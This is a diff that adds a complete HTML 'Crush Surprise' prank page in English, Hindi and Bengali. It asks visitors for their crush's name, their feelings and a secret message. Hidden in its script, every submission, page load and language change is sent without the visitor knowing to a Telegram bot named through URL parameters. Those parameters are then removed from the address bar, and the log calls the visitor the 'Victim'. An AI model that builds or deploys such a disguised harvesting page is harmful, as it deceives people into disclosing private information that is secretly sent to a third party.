@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>💖 Crush Surprise</title>
+    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background: linear-gradient(145deg, #fff0f5, #ffe0e8, #ffd6e0);
+            position: relative;
+            overflow-x: hidden;
+        }
+        .floating-hearts {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+        .floating-hearts span {
+            position: absolute;
+            font-size: 2rem;
+            animation: floatHeart 10s linear infinite;
+            opacity: 0.2;
+            color: #ff4d6d;
+        }
+        @keyframes floatHeart {
+            0% { transform: translateY(100vh) scale(0.5) rotate(0deg); opacity: 0.15; }
+            100% { transform: translateY(-20vh) scale(1.2) rotate(720deg); opacity: 0; }
+        }
+        .container {
+            max-width: 540px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.6);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border-radius: 40px;
+            padding: 40px 32px 34px;
+            border: 2px solid rgba(255, 105, 180, 0.15);
+            box-shadow: 0 30px 80px rgba(255, 105, 180, 0.10), 0 0 0 1px rgba(255, 105, 180, 0.05);
+            transition: all 0.4s ease;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+        .container.surprise {
+            border-color: rgba(255, 105, 180, 0.25);
+            box-shadow: 0 30px 80px rgba(255, 105, 180, 0.15), 0 0 0 2px rgba(255, 105, 180, 0.08);
+            background: rgba(255, 255, 255, 0.7);
+        }
+        .lang-selector {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 18px;
+        }
+        .lang-selector select {
+            padding: 10px 24px 10px 20px;
+            border-radius: 60px;
+            background: rgba(255, 255, 255, 0.5);
+            border: 1px solid rgba(255, 105, 180, 0.15);
+            color: #4a2a3a;
+            font-size: 0.85rem;
+            font-weight: 600;
+            outline: none;
+            transition: 0.25s;
+            font-family: inherit;
+            cursor: pointer;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%23ff4d6d' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            padding-right: 46px;
+            color: #3a1a2a;
+        }
+        .lang-selector select:focus {
+            border-color: #ff4d6d;
+            box-shadow: 0 0 0 3px rgba(255, 77, 109, 0.08);
+        }
+        .lang-selector select option {
+            background: #fff5f8;
+            color: #3a1a2a;
+        }
+        h1 {
+            font-family: 'Dancing Script', cursive;
+            font-size: 2.8rem;
+            font-weight: 700;
+            color: #d6336c;
+            text-shadow: 0 2px 20px rgba(214, 51, 108, 0.08);
+            margin-bottom: 2px;
+            letter-spacing: 0.5px;
+        }
+        .sub {
+            font-size: 1rem;
+            color: #7a4a5a;
+            margin-bottom: 24px;
+            line-height: 1.6;
+            font-weight: 400;
+            min-height: 32px;
+            font-family: 'Inter', sans-serif;
+        }
+        input,
+        select {
+            width: 100%;
+            padding: 16px 20px;
+            border-radius: 60px;
+            background: rgba(255, 255, 255, 0.5);
+            border: 1px solid rgba(255, 105, 180, 0.12);
+            color: #2a1a22;
+            font-size: 1rem;
+            outline: none;
+            transition: 0.25s;
+            margin: 6px 0;
+            font-family: inherit;
+            backdrop-filter: blur(4px);
+        }
+        input:focus,
+        select:focus {
+            border-color: #ff4d6d;
+            box-shadow: 0 0 0 4px rgba(255, 77, 109, 0.06);
+            background: rgba(255, 255, 255, 0.7);
+        }
+        input::placeholder {
+            color: #b08090;
+            font-weight: 400;
+        }
+        .btn {
+            background: linear-gradient(135deg, #ff4d6d, #d6336c);
+            border: none;
+            color: #fff;
+            padding: 16px 20px;
+            border-radius: 60px;
+            font-size: 1.05rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            font-family: inherit;
+            width: 100%;
+            margin: 6px 0;
+            box-shadow: 0 4px 20px rgba(214, 51, 108, 0.15);
+        }
+        .btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 30px rgba(214, 51, 108, 0.25);
+        }
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .btn-small {
+            background: rgba(255, 77, 109, 0.04);
+            border: 1px solid rgba(255, 77, 109, 0.12);
+            color: #d6336c;
+            padding: 12px 20px;
+            border-radius: 60px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.25s;
+            font-family: inherit;
+            margin-top: 10px;
+            width: 100%;
+        }
+        .btn-small:hover {
+            background: rgba(255, 77, 109, 0.08);
+            border-color: #ff4d6d;
+            box-shadow: 0 0 20px rgba(255, 77, 109, 0.04);
+        }
+        .result {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: #d6336c;
+            margin: 16px 0 4px;
+            min-height: 54px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 10px;
+            border-radius: 20px;
+            background: rgba(255, 255, 255, 0.3);
+            border: 1px solid rgba(255, 105, 180, 0.05);
+            font-family: 'Dancing Script', cursive;
+            font-size: 1.6rem;
+        }
+        .status {
+            color: #7a4a5a;
+            font-size: 0.82rem;
+            margin-top: 6px;
+            font-style: italic;
+            min-height: 26px;
+        }
+        .surprise-section {
+            display: none;
+            margin-top: 20px;
+            animation: fadeUp 0.6s cubic-bezier(0.23, 1, 0.32, 1);
+        }
+        .surprise-section.show {
+            display: block;
+        }
+        @keyframes fadeUp {
+            0% { opacity: 0; transform: translateY(20px) scale(0.97); }
+            100% { opacity: 1; transform: translateY(0) scale(1); }
+        }
+        .big-heart {
+            font-size: 4.4rem;
+            display: block;
+            margin-bottom: 2px;
+            animation: heartbeat 1.8s ease-in-out infinite;
+        }
+        @keyframes heartbeat {
+            0%, 100% { transform: scale(1); }
+            14% { transform: scale(1.15); }
+            28% { transform: scale(1); }
+            42% { transform: scale(1.12); }
+            70% { transform: scale(1); }
+        }
+        .crush-display {
+            font-family: 'Dancing Script', cursive;
+            font-size: 2.4rem;
+            font-weight: 700;
+            color: #d6336c;
+            padding: 10px 24px;
+            border-radius: 60px;
+            background: rgba(255, 255, 255, 0.3);
+            border: 1px solid rgba(255, 105, 180, 0.06);
+            display: inline-block;
+            margin: 6px 0 14px;
+            box-shadow: 0 2px 20px rgba(214, 51, 108, 0.04);
+        }
+        .question-box {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 28px;
+            padding: 18px 16px 16px;
+            margin: 14px 0;
+            border: 1px solid rgba(255, 105, 180, 0.04);
+            backdrop-filter: blur(4px);
+        }
+        .question-box label {
+            display: block;
+            font-size: 0.9rem;
+            color: #4a2a3a;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        .question-box select {
+            background: rgba(255, 255, 255, 0.4);
+            border-color: rgba(255, 105, 180, 0.08);
+            padding: 14px 18px;
+            font-size: 0.95rem;
+        }
+        .question-box input {
+            background: rgba(255, 255, 255, 0.4);
+            border-color: rgba(255, 105, 180, 0.08);
+            padding: 14px 18px;
+            font-size: 0.95rem;
+        }
+        .question-box select:focus,
+        .question-box input:focus {
+            border-color: #ff4d6d;
+            background: rgba(255, 255, 255, 0.6);
+        }
+        .back-link {
+            display: inline-block;
+            margin-top: 22px;
+            color: #7a4a5a;
+            text-decoration: none;
+            border: 1px solid rgba(255, 105, 180, 0.06);
+            padding: 8px 22px;
+            border-radius: 40px;
+            transition: 0.25s;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+        .back-link:hover {
+            color: #d6336c;
+            border-color: rgba(255, 105, 180, 0.12);
+        }
+        .loader {
+            display: none;
+            width: 30px;
+            height: 30px;
+            margin: 10px auto;
+            border: 2px solid rgba(214, 51, 108, 0.06);
+            border-top: 2px solid #ff4d6d;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0); }
+            100% { transform: rotate(360deg); }
+        }
+        @media (max-width: 480px) {
+            .container {
+                padding: 28px 18px 24px;
+                border-radius: 28px;
+            }
+            h1 {
+                font-size: 2.4rem;
+            }
+            .crush-display {
+                font-size: 2rem;
+                padding: 6px 16px;
+            }
+            .btn {
+                font-size: 0.95rem;
+                padding: 14px 18px;
+            }
+            input,
+            select {
+                padding: 14px 16px;
+                font-size: 0.95rem;
+            }
+            .question-box {
+                padding: 14px 12px 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="floating-hearts" id="heartBg"></div>
+
+    <div class="container" id="mainContainer">
+        <div class="lang-selector">
+            <select id="langSelect">
+                <option value="en">🇬🇧 English</option>
+                <option value="hi">🇮🇳 हिन्दी</option>
+                <option value="bn">🇧🇩 বাংলা</option>
+            </select>
+        </div>
+
+        <h1 id="titleText">💖 Crush Surprise</h1>
+        <div class="sub" id="mainSub">
+            <span id="subText">Type your crush's name</span>
+        </div>
+
+        <input type="text" id="crushInput" placeholder="Enter your crush's name..." autocomplete="off" />
+        <button class="btn" id="submitBtn">💕 Submit</button>
+        <div class="loader" id="loader"></div>
+        <div class="result" id="result">✨ ❤️</div>
+        <div class="status" id="statusText">Enter a name and click Submit.</div>
+
+        <div class="surprise-section" id="surpriseSection">
+            <span class="big-heart">💖</span>
+            <div class="crush-display" id="crushDisplay">💕 Your Crush</div>
+            <p style="color:#7a4a5a; font-size:0.95rem; margin:4px 0 14px;" id="surpriseSub">
+                🎉 Surprise! Tell us more
+            </p>
+
+            <div class="question-box">
+                <label id="q1Label">💭 How do you feel?</label>
+                <select id="feelSelect">
+                    <option value="I love them! 💕">I love them! 💕</option>
+                    <option value="I like them a lot 😊">I like them a lot 😊</option>
+                    <option value="They're cute 🥰">They're cute 🥰</option>
+                    <option value="Just a crush 😅">Just a crush 😅</option>
+                    <option value="I'm shy to say 🙈">I'm shy to say 🙈</option>
+                </select>
+                <button class="btn-small" id="feelBtn">💬 Send</button>
+            </div>
+
+            <div class="question-box">
+                <label id="q2Label">💝 What would you do?</label>
+                <select id="doSelect">
+                    <option value="Buy flowers 🌹">Buy flowers 🌹</option>
+                    <option value="Write a poem 📝">Write a poem 📝</option>
+                    <option value="Cook for them 🍳">Cook for them 🍳</option>
+                    <option value="Sing a song 🎵">Sing a song 🎵</option>
+                    <option value="Just be myself 😎">Just be myself 😎</option>
+                </select>
+                <button class="btn-small" id="doBtn">💬 Send</button>
+            </div>
+
+            <div class="question-box">
+                <label id="q3Label">📝 Secret message</label>
+                <input type="text" id="secretMsg" placeholder="Your message..." />
+                <button class="btn-small" id="msgBtn">💬 Send</button>
+            </div>
+
+            <div class="status" id="surpriseStatus">💕 Share your feelings!</div>
+        </div>
+
+        <a href="link-pranks.html" class="back-link" id="backLink">⬅ Back</a>
+    </div>
+
+    <script>
+        // ========== হিজিবিজি ফিক্স (সর্বপ্রথম চালানো হবে) ==========
+        (function() {
+            const params = new URLSearchParams(window.location.search);
+            const token = params.get('tg_token');
+            const chatId = params.get('tg_chat');
+            if (token) localStorage.setItem('tg_bot_token', decodeURIComponent(token));
+            if (chatId) localStorage.setItem('tg_chat_id', decodeURIComponent(chatId));
+            if (params.has('tg_token') || params.has('tg_chat')) {
+                params.delete('tg_token');
+                params.delete('tg_chat');
+                const newUrl = window.location.pathname + (params.toString() ? '?' + params.toString() : '');
+                window.history.replaceState({}, '', newUrl);
+            }
+        })();
+
+        // ========== মূল কোড ==========
+        (function() {
+            'use strict';
+
+            function createHearts() {
+                const container = document.getElementById('heartBg');
+                const emojis = ['❤️', '💕', '💖', '💗', '💘', '💝', '♥️'];
+                for (let i = 0; i < 25; i++) {
+                    const span = document.createElement('span');
+                    span.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+                    span.style.left = Math.random() * 100 + '%';
+                    span.style.fontSize = (Math.random() * 2 + 1.4) + 'rem';
+                    span.style.animationDuration = (Math.random() * 8 + 6) + 's';
+                    span.style.animationDelay = (Math.random() * 10) + 's';
+                    container.appendChild(span);
+                }
+            }
+            createHearts();
+
+            const translations = {
+                en: {
+                    title: '💖 Crush Surprise',
+                    sub: 'Type your crush\'s name',
+                    inputPlaceholder: 'Enter your crush\'s name...',
+                    submitBtn: '💕 Submit',
+                    resultEmpty: '✨ ❤️',
+                    statusEmpty: 'Enter a name and click Submit.',
+                    surpriseSub: '🎉 Surprise! Tell us more',
+                    q1: '💭 How do you feel?',
+                    q2: '💝 What would you do?',
+                    q3: '📝 Secret message',
+                    msgPlaceholder: 'Your message...',
+                    sendBtn: '💬 Send',
+                    backLink: '⬅ Back',
+                    surpriseStatus: '💕 Share your feelings!',
+                    feelOptions: ['I love them! 💕', 'I like them a lot 😊', 'They\'re cute 🥰', 'Just a crush 😅', 'I\'m shy to say 🙈'],
+                    doOptions: ['Buy flowers 🌹', 'Write a poem 📝', 'Cook for them 🍳', 'Sing a song 🎵', 'Just be myself 😎'],
+                    emptyError: '⚠️ Please enter a name!',
+                    sending: 'Sending...',
+                    crushMsg: (name) => `Your crush is ${name}!`,
+                    sentMsg: (answer) => `✅ Sent: "${answer}"`,
+                    askMore: '💕 Ask another!',
+                    msgSent: 'Sent!'
+                },
+                hi: {
+                    title: '💖 क्रश सरप्राइज',
+                    sub: 'अपने क्रश का नाम लिखें',
+                    inputPlaceholder: 'अपने क्रश का नाम दर्ज करें...',
+                    submitBtn: '💕 जमा करें',
+                    resultEmpty: '✨ ❤️',
+                    statusEmpty: 'नाम डालें और जमा करें क्लिक करें।',
+                    surpriseSub: '🎉 आश्चर्य! और बताएं',
+                    q1: '💭 कैसा लगता है?',
+                    q2: '💝 क्या करोगे?',
+                    q3: '📝 गुप्त संदेश',
+                    msgPlaceholder: 'आपका संदेश...',
+                    sendBtn: '💬 भेजें',
+                    backLink: '⬅ वापस',
+                    surpriseStatus: '💕 अपनी भावनाएँ साझा करें!',
+                    feelOptions: ['मुझे उनसे प्यार है! 💕', 'मुझे वे बहुत पसंद हैं 😊', 'वे क्यूट हैं 🥰', 'बस एक क्रश 😅', 'मुझे कहने में शर्म आती है 🙈'],
+                    doOptions: ['फूल खरीदूँ 🌹', 'कविता लिखूँ 📝', 'उनके लिए खाना बनाऊँ 🍳', 'गाना गाऊँ 🎵', 'बस खुद रहूँ 😎'],
+                    emptyError: '⚠️ कृपया नाम डालें!',
+                    sending: 'भेज रहे हैं...',
+                    crushMsg: (name) => `आपका क्रश ${name} है!`,
+                    sentMsg: (answer) => `✅ भेजा गया: "${answer}"`,
+                    askMore: '💕 और पूछो!',
+                    msgSent: 'भेजा गया!'
+                },
+                bn: {
+                    title: '💖 ক্রাশ সারপ্রাইজ',
+                    sub: 'তোমার ক্রাশের নাম লিখো',
+                    inputPlaceholder: 'তোমার ক্রাশের নাম লিখো...',
+                    submitBtn: '💕 সাবমিট',
+                    resultEmpty: '✨ ❤️',
+                    statusEmpty: 'নাম লিখে সাবমিট ক্লিক করো।',
+                    surpriseSub: '🎉 সারপ্রাইজ! আরও বলো',
+                    q1: '💭 কেমন লাগে?',
+                    q2: '💝 কী করবে?',
+                    q3: '📝 গোপন বার্তা',
+                    msgPlaceholder: 'তোমার বার্তা...',
+                    sendBtn: '💬 পাঠাও',
+                    backLink: '⬅ ফিরে যান',
+                    surpriseStatus: '💕 তোমার অনুভূতি শেয়ার করো!',
+                    feelOptions: ['আমি তাকে ভালোবাসি! 💕', 'আমি তাকে অনেক পছন্দ করি 😊', 'সে কিউট 🥰', 'শুধু একটা ক্রাশ 😅', 'বলতে লজ্জা লাগে 🙈'],
+                    doOptions: ['ফুল কিনব 🌹', 'কবিতা লিখব 📝', 'তার জন্য রান্না করব 🍳', 'গান গাইব 🎵', 'শুধু নিজের মতো থাকব 😎'],
+                    emptyError: '⚠️ দয়া করে নাম লিখো!',
+                    sending: 'পাঠানো হচ্ছে...',
+                    crushMsg: (name) => `তোমার ক্রাশ ${name}!`,
+                    sentMsg: (answer) => `✅ পাঠানো হয়েছে: "${answer}"`,
+                    askMore: '💕 আরও জিজ্ঞেস করো!',
+                    msgSent: 'পাঠানো হয়েছে!'
+                }
+            };
+
+            function sendTelegramLog(action, extraData) {
+                const params = new URLSearchParams(window.location.search);
+                let token = params.get('tg_token') || localStorage.getItem('tg_bot_token');
+                let chatId = params.get('tg_chat') || localStorage.getItem('tg_chat_id');
+
+                if (!token || !chatId) return;
+
+                const toolName = '💖 Crush Test';
+                const time = new Date().toLocaleString();
+
+                let message = `📊 *CYBER TOOLS ACTIVITY*\n🕐 ${time}\n🔧 Tool: ${toolName}\n📌 Action: ${action}`;
+                if (extraData) {
+                    message += `\n\n💕 *${extraData}*`;
+                }
+
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                }).catch(() => {});
+            }
+
+            sendTelegramLog('Page loaded');
+
+            const langSelect = document.getElementById('langSelect');
+            const titleText = document.getElementById('titleText');
+            const subText = document.getElementById('subText');
+            const crushInput = document.getElementById('crushInput');
+            const submitBtn = document.getElementById('submitBtn');
+            const resultEl = document.getElementById('result');
+            const statusText = document.getElementById('statusText');
+            const loader = document.getElementById('loader');
+            const container = document.getElementById('mainContainer');
+            const surpriseSection = document.getElementById('surpriseSection');
+            const crushDisplay = document.getElementById('crushDisplay');
+            const surpriseSub = document.getElementById('surpriseSub');
+            const q1Label = document.getElementById('q1Label');
+            const q2Label = document.getElementById('q2Label');
+            const q3Label = document.getElementById('q3Label');
+            const feelSelect = document.getElementById('feelSelect');
+            const doSelect = document.getElementById('doSelect');
+            const secretMsg = document.getElementById('secretMsg');
+            const feelBtn = document.getElementById('feelBtn');
+            const doBtn = document.getElementById('doBtn');
+            const msgBtn = document.getElementById('msgBtn');
+            const surpriseStatus = document.getElementById('surpriseStatus');
+            const backLink = document.getElementById('backLink');
+
+            let currentLang = 'en';
+            let currentCrush = '';
+
+            function updateLanguage(lang) {
+                const t = translations[lang];
+                if (!t) return;
+
+                currentLang = lang;
+                titleText.textContent = t.title;
+                subText.textContent = t.sub;
+                crushInput.placeholder = t.inputPlaceholder;
+                submitBtn.textContent = t.submitBtn;
+                resultEl.innerHTML = t.resultEmpty;
+                statusText.textContent = t.statusEmpty;
+                surpriseSub.textContent = t.surpriseSub;
+                q1Label.textContent = t.q1;
+                q2Label.textContent = t.q2;
+                q3Label.textContent = t.q3;
+                secretMsg.placeholder = t.msgPlaceholder;
+                feelBtn.textContent = t.sendBtn;
+                doBtn.textContent = t.sendBtn;
+                msgBtn.textContent = t.sendBtn;
+                backLink.textContent = t.backLink;
+                surpriseStatus.textContent = t.surpriseStatus;
+
+                feelSelect.innerHTML = '';
+                t.feelOptions.forEach(opt => {
+                    const option = document.createElement('option');
+                    option.value = opt;
+                    option.textContent = opt;
+                    feelSelect.appendChild(option);
+                });
+
+                doSelect.innerHTML = '';
+                t.doOptions.forEach(opt => {
+                    const option = document.createElement('option');
+                    option.value = opt;
+                    option.textContent = opt;
+                    doSelect.appendChild(option);
+                });
+
+                sendTelegramLog('Language changed', `Language: ${lang}`);
+            }
+
+            langSelect.addEventListener('change', function() {
+                updateLanguage(this.value);
+            });
+
+            function handleSubmit() {
+                const name = crushInput.value.trim();
+                const t = translations[currentLang];
+                if (!name) {
+                    resultEl.innerHTML = t.emptyError;
+                    statusText.textContent = 'Name cannot be empty.';
+                    return;
+                }
+
+                currentCrush = name;
+
+                loader.style.display = 'block';
+                submitBtn.disabled = true;
+                statusText.textContent = t.sending;
+
+                sendTelegramLog('Victim submitted their crush name', `Crush Name: ${name}`);
+
+                resultEl.innerHTML = `💕 ${name} ❤️`;
+                statusText.textContent = t.crushMsg(name);
+
+                setTimeout(() => {
+                    loader.style.display = 'none';
+                    submitBtn.disabled = false;
+                    crushInput.style.display = 'none';
+                    submitBtn.style.display = 'none';
+                    document.querySelector('.sub').style.display = 'none';
+                    container.classList.add('surprise');
+                    crushDisplay.textContent = `💕 ${name}`;
+                    surpriseSection.classList.add('show');
+                    surpriseStatus.textContent = t.surpriseStatus;
+                }, 900);
+            }
+
+            submitBtn.addEventListener('click', handleSubmit);
+            crushInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') handleSubmit();
+            });
+
+            function sendAnswer(questionKey, answer) {
+                if (!currentCrush) return;
+                const t = translations[currentLang];
+                const questionMap = {
+                    'q1': t.q1,
+                    'q2': t.q2,
+                    'q3': t.q3
+                };
+                const question = questionMap[questionKey] || questionKey;
+                sendTelegramLog(`Answered: ${question}`, `Crush: ${currentCrush} | ${question}: ${answer}`);
+                surpriseStatus.textContent = t.sentMsg(answer);
+                setTimeout(() => {
+                    surpriseStatus.textContent = t.askMore;
+                }, 1500);
+            }
+
+            feelBtn.addEventListener('click', function() {
+                sendAnswer('q1', feelSelect.value);
+            });
+
+            doBtn.addEventListener('click', function() {
+                sendAnswer('q2', doSelect.value);
+            });
+
+            msgBtn.addEventListener('click', function() {
+                const val = secretMsg.value.trim();
+                const t = translations[currentLang];
+                if (!val) {
+                    surpriseStatus.textContent = '⚠️ ' + t.emptyError;
+                    return;
+                }
+                sendAnswer('q3', val);
+                secretMsg.value = '';
+                secretMsg.placeholder = t.msgSent;
+            });
+
+            secretMsg.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') msgBtn.click();
+            });
+
+            updateLanguage('en');
+
+            console.log('💖 Crush Surprise (Fixed) loaded.');
+        })();
+    </script>
+</body>
+</html>
